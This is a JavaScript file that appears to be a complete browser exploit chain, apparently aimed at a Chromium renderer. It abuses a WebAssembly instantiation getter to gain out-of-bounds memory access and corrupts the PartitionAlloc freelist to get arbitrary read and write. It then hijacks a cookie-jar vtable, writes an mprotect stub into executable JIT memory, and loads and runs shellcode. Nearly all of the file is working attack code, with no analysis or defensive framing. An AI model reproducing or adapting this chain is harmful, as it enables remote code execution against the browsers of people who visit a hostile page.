wasm_xpl_done = false;
function parse_wasm_module() {
    var len = wasm_module.length / 2;
    const v9 = new Uint8Array(len);
    var buf = v9;
    for (let i12 = 0; i12 < len; i12++) {
        hex = "0x" + wasm_module.substring(i12 * 2, (i12 * 2) + 2);
        buf[i12] = parseInt(hex);
    }
    return buf;
}
function arr_to_u64(a31) {
    const v35 = new u64(a31[0], a31[1]);
    return v35;
}
function u64_to_arr(a37, a38) {
    a38[0] = a37.lo;
    a38[1] = a37.hi;
}
function read_oob(a42) {
    var lo = wasm.exports.read_u32(a42);
    const v48 = a42 + 4;
    var hi = wasm.exports.read_u32(v48);
    const v53 = new u64(lo, hi);
    return v53;
}
function write_oob(a55, a56) {
    const v57 = a56.lo;
    wasm.exports.write_u32(a55, v57);
    const v62 = a55 + 4;
    const v63 = a56.hi;
    wasm.exports.write_u32(v62, v63);
}
function read(a67) {
    u64_to_arr(a67, freelist);
    const v71 = new Uint32Array();
    var b = v71;
    b.buffer;
    junk.push(b);
    return arr_to_u64(freelist).bswap();
}
function write(a79, a80) {
    u64_to_arr(a79, freelist);
    const v85 = new Uint32Array(2);
    var rw = v85;
    rw.buffer;
    u64_to_arr(a80, rw);
    junk.push(rw);
}
function setup_wasm_rw() {
    raw_wasm = parse_wasm_module();
    var mod = WebAssembly.Module(raw_wasm);
    const v112 = {
        get imp() {
            log("getter");
            function f102() {
            }
            const v103 = { imp: f102 };
            wasm2 = WebAssembly.Instance(mod, { mod: v103 });
            const v109 = new ArrayBuffer(65536);
            spacer = v109;
            function f111() {
            }
            return f111;
        },
    };
    var ffi = { mod: v112 };
    wasm = WebAssembly.Instance(mod, ffi);
    wasm2.exports.memory.grow(1);
    junk = [];
    while (true) {
        const v127 = new ArrayBuffer(8);
        junk.push(v127);
        var p1 = read_oob(8).bswap();
        var p2 = read_oob(16).bswap();
        if (p2.sub(p1).val() == 8) {
            break;
        }
    }
    var b8ptr = read_oob(8).bswap();
    scratch = b8ptr.sub_u32(131088);
    const v153 = new DataView(wasm2.exports.memory.buffer);
    scratch_buf = v153;
    log("scratch: " + scratch.str());
    var superpage_mask = mku64((1 << 21) - 1);
    superpage = b8ptr.and(superpage_mask.not());
    var partition_page_idx = b8ptr.and(superpage_mask).shr(14).val();
    var freelist_addr = superpage.add_u32(4096 + (partition_page_idx * 32));
    write_oob(8, freelist_addr.bswap());
    const v189 = new ArrayBuffer(8);
    junk.push(v189);
    const v194 = new Uint32Array(2);
    freelist = v194;
    freelist.buffer;
}
function field(a199, a200) {
    return read(a199.add_u32((a200 * 8) - 1));
}
function random_str() {
    return Math.random().toString(36);
}
function get_rwx(a213) {
    var memory_chunk = global.and(mku64((1 << 19) - 1).not());
    var heap = read(memory_chunk.add_u32(56));
    var code_space = read(heap.add_u32(3544));
    var alloc_info = code_space.add_u32(592);
    do {
        const v238 = new RegExp(random_str());
        ("aoeu").match(v238);
        var rwx = read(alloc_info.add_u32(8));
        var limit = read(alloc_info.add_u32(16));
        var room = limit.sub(rwx).val();
    } while (room < a213)
    var rwx = limit.sub_u32(a213);
    log("rwx: " + rwx.str());
    return rwx;
}
function find_rfi() {
    array_buffer_allocator = read(superpage.add_u32(4096));
    log("array_buffer_allocator: " + array_buffer_allocator.str());
    var isolate_data = read(array_buffer_allocator.add_u32(array_buffer_allocator_to_isolate_data));
    isolate = read(isolate_data);
    log("isolate: " + isolate.str());
    var context = read(isolate.add_u32(6240));
    var native_context = field(context, 2 + 3);
    global = field(native_context, 2 + 2);
    local_dom_window = field(global, 6);
    log("local_dom_window: " + local_dom_window.str());
    var local_frame = read(local_dom_window.add_u32(72));
    var local_frame_client = read(local_frame.add_u32(64));
    var web_frame = read(local_frame_client.add_u32(8));
    var web_frame_client = read(web_frame.add_u32(104));
    log("web_frame_client: " + web_frame_client.str());
    rfi = web_frame_client.sub_u32(48);
    log("rfi: " + rfi.str());
    log("rfivt: " + read(rfi).str());
}
function read_scratch(a342) {
    var lo = scratch_buf.getUint32(a342, true);
    var hi = scratch_buf.getUint32(a342 + 4, true);
    const v353 = new u64(lo, hi);
    return v353;
}
function write_scratch(a355, a356) {
    scratch_buf.setUint32(a355, a356.lo, true);
    scratch_buf.setUint32(a355 + 4, a356.hi, true);
}
function get_code_exec() {
    var cookie_jar = rfi.add_u32(248);
    log("cookie_jar: " + cookie_jar.str());
    var vtable = scratch;
    var old_vt = read(cookie_jar);
    for (let i381 = 0; i381 < 5; i381++) {
        write_scratch(i381 * 8, read(old_vt.add_u32(i381 * 8)));
    }
    write(cookie_jar, vtable);
    var rwx = get_rwx(32);
    cookies_enabled = 2 * 8;
    write_scratch(cookies_enabled, rwx);
    var mprotect_stub = [2744,4039067648,2023406814,3188864086,131072,1978,3271888640,0];
    for (let i415 = 0; i415 < mprotect_stub.length; i415 += 2) {
        const v423 = rwx.add_u32(i415 * 4);
        const v429 = new u64(mprotect_stub[i415], mprotect_stub[i415 + 1]);
        write(v423, v429);
    }
    write(rwx.add_u32(7), scratch);
    navigator.cookieEnabled;
}
function sc_sym(a437) {
    var off = window["sym_" + a437];
    if (off === undefined) {
        throw "unknown symbol " + a437;
    }
    return off;
}
function sc_sym_off(a448) {
    return sc_offset + sc_sym(a448);
}
function sc_sym_ptr(a453) {
    return scratch.add_u32(sc_sym_off(a453));
}
function read_sc(a458) {
    return read_scratch(sc_sym_off(a458));
}
function write_sc(a462, a463) {
    write_scratch(sc_sym_off(a462), a463);
}
function load_shellcode() {
    var jmp_offset = 64;
    sc_offset = jmp_offset + 16;
    write_scratch(jmp_offset, mku64(233 + ((sc_sym("call_func") + 11) << 8)));
    if (sc.length % 2) {
        sc.push(0);
    }
    var off = sc_offset;
    for (let i492 = 0; i492 < sc.length; i492 += 2, off += 8) {
        const v504 = new u64(sc[i492], sc[i492 + 1]);
        write_scratch(off, v504);
    }
    var jmp = scratch.add_u32(jmp_offset);
    log("sc: " + jmp.str());
    write_scratch(cookies_enabled, jmp);
}
function write_str(a517, a518) {
    a518 += String.fromCharCode(0);
    function word(a523) {
        var w = 0;
        for (let i527 = 0; i527 < 4; a523++, i527++) {
            var b = a523 < a518.length ? a518.charCodeAt(a523) : 0;
            w |= b << (i527 << 3);
        }
        return w;
    }
    var num_words = (a518.length + 7) >>> 3;
    var off = 0;
    for (let i552 = 0; i552 < num_words; i552++, off += 8) {
        const v558 = a517.add_u32(off);
        const v564 = new u64(word(off), word(off + 4));
        write(v558, v564);
    }
}
function read_str(a567, a568) {
    var str = "";
    function word(a572) {
        for (let i574 = 0; (i574 < 8) && (str.length < a568); i574++) {
            str += String.fromCharCode(a572.lo & 255);
            a572 = a572.shr(8);
        }
    }
    var num_words = (a568 + 7) >>> 3;
    var off = 0;
    for (let i598 = 0; i598 < num_words; i598++, off += 8) {
        word(read(a567.add_u32(off)));
    }
    return str;
}
function process_args(a608) {
    var processed = [];
    if (a608.length > 5) {
        throw "too many args";
    }
    for (let i616 = 0; i616 < a608.length; i616++) {
        var arg = a608[i616];
        if (!(arg instanceof u64)) {
            var type = typeof arg;
            if (type === "number") {
                arg = mku64(arg);
            } else {
                if (type === "string") {
                    var buf = run_sc("alloc", arg.length + 1);
                    write_str(buf, arg);
                    arg = buf;
                } else {
                    throw "bad run_sc arg";
                }
            }
        }
        processed.push(arg);
    }
    return processed;
}
function run_sc(a646) {
    var args = process_args(Array.from(arguments).slice(1));
    var off = sc_sym_off("func_args");
    for (let i658 = 0; i658 < args.length; i658++, off += 8) {
        write_scratch(off, args[i658]);
    }
    write_sc("func_addr", sc_sym_ptr(a646));
    navigator.cookieEnabled;
    return read_sc("func_ret");
}
function read_via_sc(a675) {
    return run_sc("read_u64", a675);
}
function write_via_sc(a679, a680) {
    return run_sc("write_u64", a679, a680);
}
function reset_partition_alloc() {
    read = read_via_sc;
    write = write_via_sc;
    var allocator = read(isolate.add_u32(24040));
    run_sc("hook_partition_free", allocator);
    log("reset partition alloc, root: " + array_buffer_allocator.str());
    run_sc("reset_partition_alloc", array_buffer_allocator);
}
function run_wasm_exploit() {
    setup_wasm_rw();
    find_rfi();
    get_code_exec();
    load_shellcode();
    run_sc("prepare", rfi);
    reset_partition_alloc();
    wasm_xpl_done = true;
}
